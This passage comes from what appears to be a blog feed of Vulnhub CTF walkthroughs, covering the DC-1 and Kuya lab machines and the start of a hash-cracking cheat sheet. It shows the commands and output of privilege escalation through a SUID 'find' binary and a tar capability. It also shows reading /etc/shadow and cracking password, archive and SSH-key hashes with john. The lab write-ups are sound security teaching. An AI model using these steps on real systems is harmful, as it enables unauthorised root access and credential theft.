(66.67%) Digests, 2/3 (66.67%) SaltsProgress.........: 43033152/43033152 (100.00%)Rejected.........: 0/43033152 (0.00%)Restore.Point....: 14344384/14344384 (100.00%)Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:16352-16384Candidates.#1....: $HEX[284d6f75746f6e] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Temp: 69c Fan: 47% Util: 96% Core:1809MHz Mem:3802MHz Bus:16</code></pre><p>I didn’t have to wait too long for the admin’s password. The password was <code>53cr3t</code>. I logged in and under the content menu, I found the third flag.</p><p><img src="drupal.png" alt></p><blockquote><p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p></blockquote><p>These hints are almost ruining the experience for me…</p><h2 id="Find-with-SUID"><a href="#Find-with-SUID" class="headerlink" title="Find with SUID"></a>Find with SUID</h2><p>I used the well-known <code>LinEnum.sh</code> script to get a better grasp of the system and possibly confirm that find command with special permissions.</p><pre><code>$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.shwget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh--2019-03-08 18:46:36--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.shResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 45639 (45K) [text/plain]Saving to: `LinEnum.sh&apos;100%[======================================&gt;] 45,639      --.-K/s   in 0.04s2019-03-08 18:46:37 (1.13 MB/s) - `LinEnum.sh&apos; saved [45639/45639]$ chmod +x LinEnum.sh$ ./LinEnum.sh</code></pre><p>The interesting part from the output was this:</p><pre><code>[+] Possibly interesting SUID files:-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>SETUID and SETGID are Unix access rights flags that allow users to run an executable with the permissions of the executable’s owner or group respectively and to change behavior in directories. They are often used to allow users on a computer system to run programs with temporarily elevated privileges in order to perform a specific task.</p><p>In this case, we don’t have to be root to execute commands as root. The hint or flag said that it helps to “find” the passwd, so here is how I printed out the <code>passwd</code> file:</p><pre><code>find / -name passwd -exec cat {} \;## The PAM configuration file for the Shadow `passwd&apos; service#@include common-passwordroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shDebian-exim:x:101:104::/var/spool/exim4:/bin/falsestatd:x:102:65534::/var/lib/nfs:/bin/falsemessagebus:x:103:107::/var/run/dbus:/bin/falsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologinmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/falseflag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code></pre><h2 id="Cracking-another-hash"><a href="#Cracking-another-hash" class="headerlink" title="Cracking another hash"></a>Cracking another hash</h2><p>As you can see, there is a <code>flag4</code> user. I moved on to get the shadow file, too.</p><pre><code>find / -name shadow -exec cat {} \;root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::daemon:*:17946:0:99999:7:::bin:*:17946:0:99999:7:::sys:*:17946:0:99999:7:::sync:*:17946:0:99999:7:::games:*:17946:0:99999:7:::man:*:17946:0:99999:7:::lp:*:17946:0:99999:7:::mail:*:17946:0:99999:7:::news:*:17946:0:99999:7:::uucp:*:17946:0:99999:7:::proxy:*:17946:0:99999:7:::www-data:*:17946:0:99999:7:::backup:*:17946:0:99999:7:::list:*:17946:0:99999:7:::irc:*:17946:0:99999:7:::gnats:*:17946:0:99999:7:::nobody:*:17946:0:99999:7:::libuuid:!:17946:0:99999:7:::Debian-exim:!:17946:0:99999:7:::statd:*:17946:0:99999:7:::messagebus:*:17946:0:99999:7:::sshd:*:17946:0:99999:7:::mysql:!:17946:0:99999:7:::flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</code></pre><p>I copied this information into a text file and ran <code>john</code> on it to crack the hashes. I have successfully cracked the <code>flag4</code> user password.</p><pre><code>▲ ~/Downloads john shadow.txt --showflag4:orange:17946:0:99999:7:::1 password hash cracked, 1 left</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Access-via-SSH"><a href="#Access-via-SSH" class="headerlink" title="Access via SSH"></a>Access via SSH</h2><p>I managed to log in via SSH using these credentials and read the fourth flag in the home directory.</p><pre><code>▲ ~/Downloads ssh flag4@192.168.1.45flag4@192.168.1.45&apos;s password:Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Thu Mar  7 08:52:13 2019 from kaliflag4@DC-1:~$ ls -latotal 28drwxr-xr-x 2 flag4 flag4 4096 Mar  7 18:26 .drwxr-xr-x 3 root  root  4096 Feb 19 23:51 ..-rw------- 1 flag4 flag4  600 Mar  7 19:24 .bash_history-rw-r--r-- 1 flag4 flag4  220 Feb 19 23:25 .bash_logout-rw-r--r-- 1 flag4 flag4 3392 Feb 19 23:25 .bashrc-rw-r--r-- 1 flag4 flag4  125 Feb 19 23:28 flag4.txt-rw-r--r-- 1 flag4 flag4  675 Feb 19 23:25 .profileflag4@DC-1:~$ cat flag4.txtCan you use this same method to find or access the flag in root?Probably. But perhaps it&apos;s not that easy.  Or maybe it is?flag4@DC-1:~$</code></pre><blockquote><p>Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy.  Or maybe it is?</p></blockquote><h2 id="Popping-a-root-shell"><a href="#Popping-a-root-shell" class="headerlink" title="Popping a root shell"></a>Popping a root shell</h2><p>Since I found the find command with root SUID set I could easily read the final flag and consider this challenge done. I wanted to take these extra steps to fully compromise the system and not just go for root access immediately, but this time has come.</p><pre><code>flag4@DC-1:~$ find . -exec &apos;/bin/sh&apos; \;# whoamiroot</code></pre><p>Finally, I went to the root directory to acquire the final flag, which was:</p><pre><code># cd /root# lsthefinalflag.txt# cat thefinalflag.txtWell done!!!!Hopefully, you&apos;ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</code></pre><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kuya Walkthrough</title>
      <link href="/2019/03/03/Kuya-Walkthrough/"/>
      <url>/2019/03/03/Kuya-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="kuya.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In the last couple of days, Vulnhub published quite a few new boxes. One of them was Kuya. The difficulty is intermediate and you are required to have some knowledge in CTFs. By this, I mean that it contains steganography, which you are not likely to encounter in a real penetration testing scenario. Also, the author stated that there’ll be trolls ahead so we might come across with rabbit holes and dead ends. Enough said, let’s get started.</p><h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><p>I started with the nmap scan as usual and got the following result back:</p><pre><code>▲ ~ nmap -A -sC -p- 192.168.1.187Nmap scan report for mini (192.168.1.187)Host is up (0.00031s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)| ssh-hostkey:|   2048 11:33:6d:34:f3:f2:12:9d:c6:6c:07:54:f0:86:53:d6 (RSA)|   256 45:77:11:0d:b4:c6:3e:a4:bc:7a:b2:5f:02:03:8e:37 (ECDSA)|_  256 00:27:20:4a:d8:b6:34:78:46:0e:cd:19:c2:9d:84:6a (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: WelcomeMAC Address: 08:00:27:39:31:D7 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>As you can see, we have 2 ports open. One of them is SSH, which is probably not vulnerable, so I continued with port 80. I ran <code>dirb</code> and <code>nikto</code>. I discovered a poorly configured wordpress installation, but the whole thing was a dead end. However, the initial site was working and contained some troll comments in the source.</p><p><img src="kuya_site.png" alt="Kuya site"></p><p>The picture was stored in the <code>loot</code> directory and it had directory listing enabled. I used <code>wget</code> to easily and recursively download the files.</p><pre><code>▲ ~ wget -r http://192.168.1.187/loot--2019-03-03 20:19:50--  http://192.168.1.187/loot/1.jpgReusing existing connection to 192.168.1.187:80.HTTP request sent, awaiting response... 200 OKLength: 16834 (16K) [image/jpeg]Saving to: ‘192.168.1.187/loot/1.jpg’192.168.1.187/loot/1.jpg 100%[==================================&gt;]2019-03-03 20:19:50 (122 MB/s) - ‘192.168.1.187/loot/1.jpg’ saved [16834/16834]--2019-03-03 20:19:50--  http://192.168.1.187/loot/2.jpgReusing existing connection to 192.168.1.187:80.HTTP request sent, awaiting response... 200 OKLength: 7964 (7,8K) [image/jpeg]Saving to: ‘192.168.1.187/loot/2.jpg’192.168.1.187/loot/2.jpg 100%[==================================&gt;]2019-03-03 20:19:50 (917 MB/s) - ‘192.168.1.187/loot/2.jpg’ saved [7964/7964]--2019-03-03 20:19:50--  http://192.168.1.187/loot/3.jpgReusing existing connection to 192.168.1.187:80.HTTP request sent, awaiting response... 200 OKLength: 7087 (6,9K) [image/jpeg]Saving to: ‘192.168.1.187/loot/3.jpg’192.168.1.187/loot/3.jpg 100%[==================================&gt;]2019-03-03 20:19:50 (199 MB/s) - ‘192.168.1.187/loot/3.jpg’ saved [7087/7087]--2019-03-03 20:19:50--  http://192.168.1.187/loot/4.jpgReusing existing connection to 192.168.1.187:80.HTTP request sent, awaiting response... 200 OKLength: 173688 (170K) [image/jpeg]Saving to: ‘192.168.1.187/loot/4.jpg’192.168.1.187/loot/4.jpg 100%[==================================&gt;]2019-03-03 20:19:50 (76,5 MB/s) - ‘192.168.1.187/loot/4.jpg’ saved [173688/173688]--2019-03-03 20:19:50--  http://192.168.1.187/loot/image.jpegReusing existing connection to 192.168.1.187:80.HTTP request sent, awaiting response... 200 OKLength: 17911 (17K) [image/jpeg]Saving to: ‘192.168.1.187/loot/image.jpeg’192.168.1.187/loot/image 100%[==================================&gt;]2019-03-03 20:19:50 (449 MB/s) - ‘192.168.1.187/loot/image.jpeg’ saved [17911/17911]▲ ~ cd 192.168.1.187▲ ~/192.168.1.187 lsicons  index.html  loot▲ ~/192.168.1.187 cd loot▲ ~/192.168.1.187/loot ls1.jpg  2.jpg  3.jpg  4.jpg  image.jpeg</code></pre><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><p>I got 5 images and used <code>steghide</code> on them to see whether they contain embedded data or not. I simply left the passphrases empty.</p><pre><code>▲ ~/192.168.1.187/loot steghide extract -sf 1.jpgEnter passphrase:wrote extracted data to &quot;secret.txt&quot;.▲ ~/192.168.1.187/loot steghide extract -sf 2.jpgEnter passphrase:wrote extracted data to &quot;emb.txt&quot;.▲ ~/192.168.1.187/loot steghide extract -sf 3.jpgEnter passphrase:steghide: could not extract any data with that passphrase!▲ ~/192.168.1.187/loot steghide extract -sf 4.jpgEnter passphrase:wrote extracted data to &quot;loot.pcapng&quot;.▲ ~/192.168.1.187/loot steghide extract -sf image.jpegEnter passphrase:wrote extracted data to &quot;robots.txt&quot;.</code></pre><p>One file was empty and one was pcapng, the other three were text files. Here are the contents of each text file. The first one contained base64 encoded text, which was not really helpful. The second one was a bit funnier, it contained some brainfuck programming language source code, so I just used an online interpreter to get the result.</p><blockquote><p>The first flag: <strong>V2hhdCBpcyBCYWx1dCA/</strong></p></blockquote><p>The <code>robots.txt</code> contained the file names in that directory.</p><pre><code>▲ ~/192.168.1.187/loot cat secret.txtWW91IHJlYWxseSB0aG91Z2h0IGl0IHdvdWxkIGJlIHRoaXMgZWFzeSA/IEtlZXAgZGlnZ2luZyAhIExvdHMgb2YgdHJvbGxzIHRvIGRlZmVhdC4=▲ ~/192.168.1.187/loot cat secret.txt | base64 -dYou really thought it would be this easy ? Keep digging ! Lots of trolls to defeat.▲ ~/192.168.1.187/loot cat emb.txt+[---&gt;++&lt;]&gt;+.++[-&gt;++++&lt;]&gt;+.+++++++..[++&gt;---&lt;]&gt;--.++[-&gt;++&lt;]&gt;.[---&gt;+&lt;]&gt;+++.-.---------.--[---&gt;+&lt;]&gt;-.+.-.--[-&gt;+++&lt;]&gt;-.[-&gt;+++++++&lt;]&gt;.++++++.---.[--&gt;+++++&lt;]&gt;+++.+++[-&gt;++&lt;]&gt;.[--&gt;+++&lt;]&gt;.+++++++++.+.+.[----&gt;+&lt;]&gt;+++.+++[-&gt;++&lt;]&gt;.--[---&gt;+&lt;]&gt;.-----------.++++++.-[---&gt;+&lt;]&gt;--.-[---&gt;++&lt;]&gt;-.++++++++++.+[----&gt;+&lt;]&gt;+++.&gt;+[---&gt;++&lt;]&gt;.&gt;-[-----&gt;+&lt;]&gt;-.++[-&gt;++&lt;]&gt;..----.-[---&gt;++&lt;]&gt;+.-.--[++++&gt;---&lt;]&gt;.-------------.-[---&gt;+&lt;]&gt;+++.+[--&gt;+&lt;]&gt;+++++.+.++[-&gt;+++++&lt;]&gt;.--.+[-----&gt;+&lt;]&gt;.--[++&gt;---&lt;]&gt;.+[-&gt;++&lt;]&gt;.-[---&gt;++&lt;]&gt;+.--.-[----&gt;+++&lt;]&gt;-.▲ ~/192.168.1.187/loot cat robots.txt1.jpg2.&quot;3.&quot;4.&quot;5.&quot;image.jpeg</code></pre><h2 id="Capturing-the-packets"><a href="#Capturing-the-packets" class="headerlink" title="Capturing the packets"></a>Capturing the packets</h2><p><img src="wireshark.png" alt="Wireshark"></p><p>There was not too much traffic in the packet capture. The only thing that stood out for me was the <code>loot.7z</code> file download. Wireshark has a handy feature that can export HTTP objects, you can find it under <code>File -&gt; Export object -&gt; HTTP</code>. This way, you can get the compressed file. I could have been easy if it was not encrypted.</p><pre><code>▲ ~/Downloads 7z e loot.7zScanning the drive for archives:1 file, 1976 bytes (2 KiB)Extracting archive: loot.7z--Path = loot.7zType = 7zPhysical Size = 1976Headers Size = 216Method = LZMA2:12 7zAESSolid = +Blocks = 1Enter password (will not be echoed):ERROR: Data Error in encrypted file. Wrong password? : loot/id_rsaERROR: Data Error in encrypted file. Wrong password? : loot/id_rsa.pub</code></pre><h2 id="Cracking-the-7z-archive"><a href="#Cracking-the-7z-archive" class="headerlink" title="Cracking the 7z archive"></a>Cracking the 7z archive</h2><p>Time to use <code>7z2john</code> to extract hash. Note that you should download and use <code>john</code>‘s bleeding jumbo version from <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">Github</a>, which contains the required files.</p><pre><code>▲ ~/Downloads ./7z2john.pl loot.7z &gt; crackme_7z</code></pre><p>Now, simply pass the file to <code>john</code> and you are good to go.</p><pre><code>▲ ~/Downloads john crackme_7zCreated directory: /root/.johnUsing default input encoding: UTF-8Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])Cost 1 (iteration count) is 524288 for all loaded hashesCost 2 (padding size) is 0 for all loaded hashesCost 3 (compression type) is 2 for all loaded hashesWill run 4 OpenMP threadsProceeding with single, rules:WordlistPress &apos;q&apos; or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if anyWarning: Only 30 candidates buffered for the current salt, minimum 32needed for performance.Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlistmanchester       (loot.7z)1g 0:00:06:47 DONE 2/3 (2019-03-03 17:04) 0.002453g/s 25.59p/s 25.59c/s 25.59C/s katrina..hermosaUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed▲ ~/Downloads john crackme --showloot.7z:manchester1 password hash cracked, 0 left</code></pre><h2 id="Getting-the-SSH-keys"><a href="#Getting-the-SSH-keys" class="headerlink" title="Getting the SSH keys"></a>Getting the SSH keys</h2><p>I extracted the file with the password <code>manchester</code> and tried to log in with the private key, but it required a password. Bummer! By the way, the username can be found in the public key file. I thought, why not use <code>john</code> again?! So, I used <code>ssh2john</code> to get the hash and cracked it the same way I cracked the 7z archive.</p><pre><code>▲ ~/Downloads ssh -i id_rsa test@192.168.1.187The authenticity of host &apos;192.168.1.187 (192.168.1.187)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:zyMHWQ6tB6OR+dKyv0X7ZXx6oCbYuH9/YbAxBwd5TCw.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;192.168.1.187&apos; (ECDSA) to the list of known hosts.Enter passphrase for key &apos;id_rsa&apos;:test@192.168.1.187: Permission denied (publickey).</code></pre><p>I went back to the downloaded bleeding edge <code>john</code> directory and used <code>ssh2john</code> to extract the hash.</p><pre><code>▲ ~/Downloads ./ssh2john.pl id_rsa &gt; crackme_ssh</code></pre><p>You can see that the procedure is exactly the same as with the 7z file.</p><pre><code>▲ ~/Downloads john crackme_sshUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Proceeding with single, rules:WordlistPress &apos;q&apos; or Ctrl-C to abort, almost any other key for statusWarning: Only 2 candidates buffered for the current salt, minimum 8needed for performance.Almost done: Processing the remaining buffered candidate passwords, if anyWarning: Only 5 candidates buffered for the current salt, minimum 8needed for performance.Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlisthello            (/root/Downloads/id_rsa)Proceeding with incremental:ASCIIhello            (/root/Downloads/id_rsa)3g 0:00:00:46  3/3 (2019-03-03 18:01) 0.06518g/s 1800Kp/s 1800Kc/s 1800KC/s cpodso..cpop1.Session aborted▲ ~/Downloads john crackme_ssh --show /root/Downloads/id_rsa:hello1 password hash cracked, 0 left</code></pre><h2 id="Gaining-access"><a href="#Gaining-access" class="headerlink" title="Gaining access"></a>Gaining access</h2><p>The password was a simple <code>hello</code>. With this information, I was able to log in as <code>test</code>. The second flag was hidden in the <code>sshscript.sh</code> file.</p><pre><code>▲ ~/Downloads ssh -i id_rsa test@192.168.1.187Enter passphrase for key &apos;id_rsa&apos;:Linux mini 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Mar  2 20:35:16 2019 from 192.168.43.203test@mini:~$ ls -latotal 20drwxr-xr-x 3 test root 4096 Dec 18 01:33 .drwxr-xr-x 4 root root 4096 Dec  2 00:26 ..-rw------- 1 test test  464 Dec 18 01:33 .bash_historydrwx------ 2 test test 4096 Dec  2 14:34 .ssh-rw-r--r-- 1 test test  218 Mar  2 20:37 .wget-hststest@mini:~$ cd .sshtest@mini:~/.ssh$ ls -latotal 24drwx------ 2 test test 4096 Dec  2 14:34 .drwxr-xr-x 3 test root 4096 Dec 18 01:33 ..-rw-r--r-- 1 test test  391 Dec  2 14:34 authorized_keys-rw------- 1 test test 1766 Dec  2 03:15 id_rsa-rw-r--r-- 1 test test  391 Dec  2 03:15 id_rsa.pub-rwxr-xr-x 1 test test  115 Dec  2 14:30 sshscript.shtest@mini:~/.ssh$ cat sshscript.sh#!/bin/bashecho &quot;FInally you got a shell ! Here&apos;s a flag for you  5256247262. Let&apos;s see  where you go from here&quot;test@mini:~/.ssh$</code></pre><blockquote><p>The second flag: <strong>5256247262</strong></p></blockquote><div class="addthis_tipjar_inline"></div><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>I did my usual enumeration, which included the <code>LinEnum.sh</code> script, but I couldn’t find anything useful like a kernel exploit or binaries with root privileges. Then, I went to the web server directory under <code>/var/www/html</code> and started looking for juicy files.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'database_name_here'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'kuya'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'Chrepia##@@!!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line">define(<span class="string">'DB_CHARSET'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don't change this if in doubt. */</span></span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** snip **/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">'wp-settings.php'</span>);</span><br></pre></td></tr></table></figure><p>I found a database password in the <code>wp-config-sample.php</code> file. I used this information to switch user to <code>kuya</code>. Now, this was pretty easy. Let’s move on to his home directory. The <code>who_dis.txt</code> file contained the fourth flag.</p><pre><code>kuya@mini:~$ cat who_dis.txtWell Done !BTW this was too easy :DHere is something for you IL0v3C@f3HaV@nA</code></pre><blockquote><p>The fourth flag: <strong>IL0v3C@f3HaV@nA</strong></p></blockquote><h2 id="Reading-files-as-root"><a href="#Reading-files-as-root" class="headerlink" title="Reading files as root"></a>Reading files as root</h2><p>In the home directory, I noticed the <code>.bash_history</code> file. It’s always a good idea to check these, because they can contain valuable information.</p><pre><code>kuya@mini:~$ cat .bash_historycd /home/kuyachown -R kuyachown -R kuya /home/kiyachown -R kuya /home/kuyasu rootcd /home/kuyacat /etc/shadow./tar -cvf shadow.tar /etc/shadowtar -cvf shadow.tar /etc/shadowwhich targetcap -r / 2&gt;/dev/nullsetcap cap_dac_read_search=epexit</code></pre><p>I had to brush up my knowledge on the <code>setcap</code> and <code>getcap</code> commands, so I checked the corresponding man pages and searched the internet.</p><blockquote><p>Linux’s thread/process privilege checking is based on capabilities. They’re flags to the thread that indicate what kind of additional privileges they’re allowed to use.</p></blockquote><p>The <code>setcap cap_dac_read_search=ep</code> command means that we are able to bypass file read permission checks, directory read and execute permission checks. This capability was probably was set on the <code>tar</code> executable because the shadow file was compressed with it and this means that it can read files as root.</p><h3 id="Reading-the-shadow-file"><a href="#Reading-the-shadow-file" class="headerlink" title="Reading the shadow file"></a>Reading the shadow file</h3><p> I copied the tar command from the bash history and used it as it is. Then, I extracted the tar file and I was able to read the shadow file.</p><pre><code>kuya@mini:~$ tar -cvf shadow.tar /etc/shadowtar: Removing leading `/&apos; from member names/etc/shadowkuya@mini:~$ tar xvf shadow.taretc/shadowkuya@mini:~$ cat etc/shadow root:$6$xmBqiwRc$UE1ERWQecpCHwNsyE4yhSYv8wMD1H1yvB4TCBZQaoZMuxioJ0c7xE/Q/WwiRK2Vdf2Y2KGeHCh4NHAq5L4JTg0:17863:0:99999:7:::daemon:*:17863:0:99999:7:::bin:*:17863:0:99999:7:::sys:*:17863:0:99999:7:::sync:*:17863:0:99999:7:::games:*:17863:0:99999:7:::man:*:17863:0:99999:7:::lp:*:17863:0:99999:7:::mail:*:17863:0:99999:7:::news:*:17863:0:99999:7:::uucp:*:17863:0:99999:7:::proxy:*:17863:0:99999:7:::www-data:*:17863:0:99999:7:::backup:*:17863:0:99999:7:::list:*:17863:0:99999:7:::irc:*:17863:0:99999:7:::gnats:*:17863:0:99999:7:::nobody:*:17863:0:99999:7:::systemd-timesync:*:17863:0:99999:7:::systemd-network:*:17863:0:99999:7:::systemd-resolve:*:17863:0:99999:7:::systemd-bus-proxy:*:17863:0:99999:7:::_apt:*:17863:0:99999:7:::messagebus:*:17863:0:99999:7:::sshd:*:17863:0:99999:7:::kuya:$6$MpPRKfei$KvGUeoeKXHNg8iSzMHPST4vtIe3GbjAHAf2gtJijQciwLtaeBNMi0pHjx1BSetZB/au8x.yKF9SB.nLtW3WRT.:17863:0:99999:7:::test:!:17865:0:99999:7:::mysql:!:17867:0:99999:7:::</code></pre><h2 id="The-root-directory"><a href="#The-root-directory" class="headerlink" title="The root directory"></a>The root directory</h2><p>After I confirmed that I can read files like I’m root, I used tar on the root directory. This way I could read the final flag, which was hidden in the <code>M3M3L0rd.txt</code> file.</p><blockquote><p>The fifth flag: <strong>WeasleyIsOurKing</strong></p></blockquote><p>I don’t know if all of the flags are valid flags because the author planted 3 of them, but I found 5.</p><h3 id="Root-shell"><a href="#Root-shell" class="headerlink" title="Root shell?!"></a>Root shell?!</h3><p>I tried to crack the root password, but I gave up after some time… Sadly, I couldn’t find any other solution to get a root shell. Did you manage to get a root shell or did you do something different? Let me know, in the comments!</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Identifying and Cracking Hashes</title>
      <link href="/2019/01/21/Identifying-and-Cracking-Hashes/"/>
      <url>/2019/01/21/Identifying-and-Cracking-Hashes/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>During a penetration test or a simple CTF, you might come across with different hashes. In the first section, I’d like to show you some tools that can help you identify them. After you have identified the hash, you probably want to crack it. That’s why I wrote the cracking sections in cheatsheet style. I hope you like it!</p><h1 id="Identifying-different-hashes"><a href="#Identifying-different-hashes" class="headerlink" title="Identifying different hashes"></a>Identifying different hashes</h1><h3 id="The-hash-identifier"><a href="#The-hash-identifier" class="headerlink" title="The hash-identifier"></a>The hash-identifier</h3><p>There quite a few tools out there that can help you identify hashes. Which one is the best? Hard to say. Kali comes with at least 2 hash identifier tool that I know about. The first one is <code>hash-identifier</code>. The usage is very simple:</p><pre><code>root@kali:~# hash-identifier-------------------------------------------------------------------------HASH: 48bb6e862e54f2a795ffc4e541caed4dPossible Hashs:[+]  MD5[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))Least Possible Hashs:[+]  RAdmin v2.x[+]  NTLM[+]  MD4[+]  MD2[+]  MD5(HMAC)[+]  MD4(HMAC)[+]  MD2(HMAC)[+]  MD5(HMAC(Wordpress))[+]  Haval-128[+]  Haval-128(HMAC)[+]  RipeMD-128[+]  RipeMD-128(HMAC)[+]  SNEFRU-128[+]  SNEFRU-128(HMAC)[+]  Tiger-128[+]  